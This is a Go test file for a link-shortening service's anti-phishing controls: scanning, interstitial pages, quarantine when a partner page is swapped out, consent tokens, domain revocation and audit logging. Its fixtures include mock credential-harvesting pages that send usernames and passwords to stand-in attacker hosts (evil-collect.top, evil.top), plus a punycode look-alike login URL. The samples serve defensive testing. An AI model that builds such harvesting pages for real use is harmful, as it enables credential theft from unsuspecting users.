package service

import (
	"context"
	"errors"
	"net/url"
	"testing"
	"time"

	"shortlink/internal/artifact"
	"shortlink/internal/audit"
	"shortlink/internal/htmlx"
	"shortlink/internal/model"
	"shortlink/internal/netutil"
	"shortlink/internal/risk"
	"shortlink/internal/store"
)

// fakeNet serves canned pages per URL and lets a test swap what a URL returns
// to simulate the approve-then-swap move.
type fakeNet struct {
	pages map[string]fakePage
}

type fakePage struct {
	body   string
	status int
	tls    bool
}

func newFakeNet() *fakeNet { return &fakeNet{pages: map[string]fakePage{}} }

func (f *fakeNet) set(url, body string) {
	f.pages[url] = fakePage{body: body, status: 200, tls: true}
}

func (f *fakeNet) fetch(_ context.Context, raw string) (*ProbeResult, error) {
	p, ok := f.pages[raw]
	if !ok {
		return nil, errors.New("fakeNet: no such page " + raw)
	}
	return &ProbeResult{FinalURL: raw, StatusCode: p.status, Body: []byte(p.body), TLSValid: p.tls}, nil
}

func analyze(raw string, res *ProbeResult) *artifact.Fingerprint {
	u, _ := url.Parse(raw)
	doc, _ := htmlx.Parse(res.Body, u)
	return buildFingerprint(raw, res, doc)
}

// buildFingerprint is a test-local copy of the production analyzer logic,
// kept minimal but exercising the same artifact fields.
func buildFingerprint(raw string, res *ProbeResult, doc *htmlx.Doc) *artifact.Fingerprint {
	pageHost := netutil.HostOf(res.FinalURL)
	f := &artifact.Fingerprint{
		FinalURL: res.FinalURL, Host: pageHost, Registrable: netutil.Registrable(pageHost),
		Title: doc.Title, TLSValid: res.TLSValid,
		MetaRefreshTargets: doc.MetaRefresh, FrameSources: doc.Iframes,
	}
	seen3p := map[string]bool{}
	for _, s := range doc.Scripts {
		f.ExternalScripts = append(f.ExternalScripts, s)
		h := netutil.HostOf(s)
		if h != "" && !netutil.SameSite(h, pageHost) {
			seen3p[netutil.Registrable(h)] = true
		}
	}
	for _, form := range doc.Forms {
		f.FormActions = append(f.FormActions, form.Action)
		if h := netutil.HostOf(form.Action); h != "" {
			f.FormActionHosts = append(f.FormActionHosts, h)
			if !netutil.SameSite(h, pageHost) {
				seen3p[netutil.Registrable(h)] = true
			}
		}
		if form.HasPassword {
			f.HasPassword = true
			f.PasswordForms++
		}
	}
	for k := range seen3p {
		f.ThirdPartyDomains = append(f.ThirdPartyDomains, k)
	}
	artifact.Stamp(f)
	return f
}

func TestEndToEndApproveThenSwap(t *testing.T) {
	fn := newFakeNet()
	target := "https://promo.partner.com/spring"
	fn.set(target, `<html><title>Spring Promo</title><body>
		<h1>Save 20%</h1><a href="https://partner.com/shop">Shop</a>
		<script src="https://www.google-analytics.com/analytics.js"></script>
	</body></html>`)

	svc, mem := newTestService(t, fn)
	allow := risk.NewAllowlist([]risk.Domain{
		{Pattern: "partner.com", Owner: "Partner A", FirstParty: false},
	})
	svc.SetAllowlist(allow)

	res, err := svc.Create(context.Background(), CreateRequest{
		Target:   target,
		Creator:  model.Creator{ID: "u_mkt_01", Name: "Marketing A", Dept: "marketing"},
		Campaign: "spring-2026",
	})
	if err != nil {
		t.Fatal(err)
	}
	if res.Link.Status != model.StatusPending {
		t.Fatalf("expected pending, got %s", res.Link.Status)
	}
	if !res.Link.ForceInterstitial {
		t.Fatal("external link must force interstitial")
	}

	// Pre-approval click: interstitial, not a redirect.
	d, _ := svc.Resolve(res.Link.Code)
	if d.Kind != DecisionInterstitial {
		t.Fatalf("unscanned external click should be interstitial, got %s", d.Kind)
	}

	// Patrol promotes it and captures a baseline.
	out, err := svc.ScanLink(context.Background(), res.Link.ID)
	if err != nil {
		t.Fatal(err)
	}
	if !out.BecameBaseline || out.Status != model.StatusActive {
		t.Fatalf("expected promotion to active+baseline, got %+v", out)
	}

	link, _ := mem.Get(res.Link.ID)
	if link.Baseline == nil {
		t.Fatal("baseline not recorded")
	}

	// Post-approval click on a clean active link: still interstitial, because
	// it is external and nobody has explicitly cleared it. That is the intended
	// stance — approval alone does not buy a silent redirect.
	d, _ = svc.Resolve(res.Link.Code)
	if d.Kind != DecisionInterstitial {
		t.Fatalf("external active link should still show interstitial, got %s", d.Kind)
	}

	// THE ATTACK: partner page is swapped for a credential harvester.
	fn.set(target, `<html><title>Account Verification</title><body>
		<h1>请验证您的账户</h1>
		<form action="https://evil-collect.top/post" method="post">
			<input type="text" name="user">
			<input type="password" name="pass">
			<button>登录</button>
		</form>
		<script src="https://evil-collect.top/kit.js"></script>
	</body></html>`)

	out, err = svc.ScanLink(context.Background(), res.Link.ID)
	if err != nil {
		t.Fatal(err)
	}
	if !out.Quarantined {
		t.Fatalf("swap should quarantine the link, got %+v", out)
	}
	if out.Status != model.StatusQuarantined {
		t.Fatalf("status = %s", out.Status)
	}

	// And the click path reflects it immediately.
	d, _ = svc.Resolve(res.Link.Code)
	if d.Kind != DecisionBlocked {
		t.Fatalf("quarantined link must block, got %s", d.Kind)
	}

	// Consent token cannot rescue a quarantined link.
	d, _ = svc.Consent(res.Link.Code, "anything")
	if d.Kind != DecisionBlocked {
		t.Fatalf("consent on quarantined should block, got %s", d.Kind)
	}

	// Traceability: the audit chain records the creation and the quarantine
	// and verifies.
	entries := svc.Audit().Entries()
	var sawCreate, sawQuar bool
	for _, e := range entries {
		if e.Action == "create" && e.LinkID == res.Link.ID {
			sawCreate = true
			if e.Actor != "u_mkt_01" {
				t.Fatalf("create actor = %q", e.Actor)
			}
		}
		if e.Action == "scan_quarantined" && e.LinkID == res.Link.ID {
			sawQuar = true
		}
	}
	if !sawCreate || !sawQuar {
		t.Fatalf("audit trail incomplete: create=%v quarantine=%v", sawCreate, sawQuar)
	}
	if err := svc.Audit().Verify(); err != nil {
		t.Fatalf("audit chain broken: %v", err)
	}
}

func TestConsentTokenBoundToLink(t *testing.T) {
	fn := newFakeNet()
	a := "https://a.partner.com/x"
	b := "https://b.partner.com/y"
	fn.set(a, `<html><body>a</body></html>`)
	fn.set(b, `<html><body>b</body></html>`)
	svc, _ := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil))

	ra, _ := svc.Create(context.Background(), CreateRequest{Target: a, Creator: model.Creator{ID: "u1"}})
	rb, _ := svc.Create(context.Background(), CreateRequest{Target: b, Creator: model.Creator{ID: "u1"}})

	da, _ := svc.Resolve(ra.Link.Code)
	if da.Kind != DecisionInterstitial || da.Token == "" {
		t.Fatalf("expected interstitial with token, got %+v", da)
	}
	// Token from a used on b must fail.
	d, _ := svc.Consent(rb.Link.Code, da.Token)
	if d.Kind != DecisionBlocked || d.Reason != "invalid_consent_token" {
		t.Fatalf("cross-link token accepted: %+v", d)
	}
	// Tampering with the token must fail.
	if d, _ := svc.Consent(ra.Link.Code, da.Token+"x"); d.Kind != DecisionBlocked {
		t.Fatal("tampered token accepted")
	}
	// The genuine token works once and resolves to the target.
	d, _ = svc.Consent(ra.Link.Code, da.Token)
	if d.Kind != DecisionRedirect || d.Location != a {
		t.Fatalf("consent failed: %+v", d)
	}
}

func TestTokenExpiry(t *testing.T) {
	fn := newFakeNet()
	target := "https://p.partner.com/x"
	fn.set(target, `<html><body>x</body></html>`)
	svc, _ := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil))

	now := time.Now()
	svc.nowFn = func() time.Time { return now }
	r, _ := svc.Create(context.Background(), CreateRequest{Target: target, Creator: model.Creator{ID: "u1"}})
	d, _ := svc.Resolve(r.Link.Code)
	if d.Kind != DecisionInterstitial {
		t.Fatal("expected interstitial")
	}
	now = now.Add(tokenTTL + time.Second)
	if got, _ := svc.Consent(r.Link.Code, d.Token); got.Kind != DecisionBlocked {
		t.Fatalf("expired token accepted: %+v", got)
	}
}

func TestBlockedAtCreation(t *testing.T) {
	fn := newFakeNet()
	svc, _ := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil))

	// Unknown domain + http + punycode-ish brand abuse pushes over Blocked.
	_, err := svc.Create(context.Background(), CreateRequest{
		Target:  "http://secure-login-verify.xn--fiqs8s.top/",
		Creator: model.Creator{ID: "u1"},
	})
	if !errors.Is(err, ErrInvalidDest) {
		t.Fatalf("expected refusal, got %v", err)
	}
}

// An unknown-but-plausible partner domain must not land in the human review
// queue — that queue is the thing marketing will route around. It goes to the
// scanner, and the interstitial carries the risk to the recipient.
func TestUnknownDomainScansNotReview(t *testing.T) {
	fn := newFakeNet()
	svc, _ := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil))

	r, err := svc.Create(context.Background(), CreateRequest{
		Target:  "https://brand-new-partner.example/landing",
		Creator: model.Creator{ID: "u1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if r.Link.Status != model.StatusPending {
		t.Fatalf("unknown domain should be pending (scan-driven), got %s", r.Link.Status)
	}
	if !r.Link.ForceInterstitial {
		t.Fatal("unknown domain must force interstitial")
	}
}

// A genuinely high-risk target still goes to a human.
func TestHighRiskRequiresReview(t *testing.T) {
	fn := newFakeNet()
	svc, _ := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil))

	r, err := svc.Create(context.Background(), CreateRequest{
		// http + IP-literal + unknown domain lands in the High band without
		// crossing Blocked.
		Target:  "http://8.8.8.8/landing",
		Creator: model.Creator{ID: "u1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if r.Link.Status != model.StatusQuarantined {
		t.Fatalf("high risk should require review, got %s (score %d)", r.Link.Status, r.Link.Risk.Score)
	}
}

func TestCreatorVolumeLimit(t *testing.T) {
	fn := newFakeNet()
	svc, _ := newTestService(t, fn)
	svc.cfg.CreatorLimitPerHour = 3
	svc.SetAllowlist(nil2allow())

	for i := 0; i < 3; i++ {
		if _, err := svc.Create(context.Background(), CreateRequest{
			Target: "https://partner.com/page", Creator: model.Creator{ID: "spam"},
		}); err != nil {
			t.Fatalf("create %d: %v", i, err)
		}
	}
	_, err := svc.Create(context.Background(), CreateRequest{
		Target: "https://partner.com/page", Creator: model.Creator{ID: "spam"},
	})
	if !errors.Is(err, ErrRateLimited) {
		t.Fatalf("expected rate limit, got %v", err)
	}
}

func TestCascadeRevokeByDomain(t *testing.T) {
	fn := newFakeNet()
	fn.set("https://p1.partner.com/a", `<html><body>a</body></html>`)
	fn.set("https://p2.partner.com/b", `<html><body>b</body></html>`)
	fn.set("https://other.com/c", `<html><body>c</body></html>`)
	svc, mem := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist([]risk.Domain{{Pattern: "partner.com", Owner: "P"}, {Pattern: "other.com", Owner: "O"}}))

	r1, _ := svc.Create(context.Background(), CreateRequest{Target: "https://p1.partner.com/a", Creator: model.Creator{ID: "u1"}})
	r2, _ := svc.Create(context.Background(), CreateRequest{Target: "https://p2.partner.com/b", Creator: model.Creator{ID: "u1"}})
	r3, _ := svc.Create(context.Background(), CreateRequest{Target: "https://other.com/c", Creator: model.Creator{ID: "u1"}})
	_ = r3

	res, err := svc.RevokeDomain("promo.partner.com", "sec_ops", "partner domain compromised")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Revoked) != 2 {
		t.Fatalf("expected 2 revoked, got %d", len(res.Revoked))
	}
	for _, id := range []string{r1.Link.ID, r2.Link.ID} {
		l, _ := mem.Get(id)
		if l.Status != model.StatusRevoked {
			t.Fatalf("%s not revoked: %s", id, l.Status)
		}
		if l.RevokedBy != "sec_ops" {
			t.Fatalf("%s revoked_by = %q", id, l.RevokedBy)
		}
	}
	l3, _ := mem.Get(r3.Link.ID)
	if l3.Status == model.StatusRevoked {
		t.Fatal("unrelated domain was revoked")
	}
}

func TestRecipientReportsAutoQuarantine(t *testing.T) {
	fn := newFakeNet()
	target := "https://p.partner.com/x"
	fn.set(target, `<html><body>x</body></html>`)
	svc, mem := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist([]risk.Domain{{Pattern: "partner.com"}}))

	r, _ := svc.Create(context.Background(), CreateRequest{Target: target, Creator: model.Creator{ID: "u1"}})
	if _, err := svc.ScanLink(context.Background(), r.Link.ID); err != nil {
		t.Fatal(err)
	}
	l, _ := mem.Get(r.Link.ID)
	if l.Status != model.StatusActive {
		t.Fatalf("setup: status %s", l.Status)
	}
	for i := 0; i < 3; i++ {
		if _, err := svc.Report(r.Link.Code, "phishing"); err != nil {
			t.Fatal(err)
		}
	}
	l, _ = mem.Get(r.Link.ID)
	if l.Status != model.StatusQuarantined || l.QuarantineReason != "recipient_reports" {
		t.Fatalf("expected report quarantine, got %s / %s", l.Status, l.QuarantineReason)
	}
}

func TestUnreachableDuringReviewQuarantines(t *testing.T) {
	fn := newFakeNet() // no page registered -> fetch error
	svc, mem := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil2allow().All()))
	target := "https://gone.partner.com/x"
	// Register then remove to simulate a page that vanishes after creation.
	fn.set(target, `<html><body>x</body></html>`)
	r, _ := svc.Create(context.Background(), CreateRequest{Target: target, Creator: model.Creator{ID: "u1"}})
	delete(fn.pages, target)

	for i := 0; i < 3; i++ {
		if _, err := svc.ScanLink(context.Background(), r.Link.ID); err != nil {
			t.Fatal(err)
		}
	}
	l, _ := mem.Get(r.Link.ID)
	if l.Status != model.StatusQuarantined {
		t.Fatalf("expected quarantine after repeated fetch failures, got %s", l.Status)
	}
}

func TestApproveRefetchesLive(t *testing.T) {
	fn := newFakeNet()
	target := "https://p.partner.com/x"
	fn.set(target, `<html><body>ok</body></html>`)
	svc, mem := newTestService(t, fn)
	svc.SetAllowlist(risk.NewAllowlist(nil))

	r, _ := svc.Create(context.Background(), CreateRequest{Target: target, Creator: model.Creator{ID: "u1"}})
	// Link is quarantined (unknown domain). Swap to phishing before approval.
	fn.set(target, `<html><body><form action="https://evil.top/x"><input type="password"></form></body></html>`)
	if _, err := svc.Approve(context.Background(), r.Link.ID, "reviewer", "looks fine", true); err == nil {
		t.Fatal("approval should fail when the live page is a harvester")
	}
	l, _ := mem.Get(r.Link.ID)
	if l.Status == model.StatusActive {
		t.Fatal("link became active despite bad live page")
	}
}

// --- helpers -------------------------------------------------------------

func newTestService(t *testing.T, fn *fakeNet) (*Service, *store.Memory) {
	t.Helper()
	mem := store.NewMemory()
	allow := risk.NewAllowlist(nil)
	sc := risk.NewScorer(allow)
	seals, err := RandomSealKey()
	if err != nil {
		t.Fatal(err)
	}
	log := audit.New()
	svc := New(Config{
		SelfHosts:    []string{"s.example.com"},
		ShortBaseURL: "https://s.example.com",
	}, mem, sc, allow, seals, log)
	svc.SetFetcher(fn.fetch, analyze)
	return svc, mem
}

func nil2allow() *risk.Allowlist { return risk.NewAllowlist(nil) }
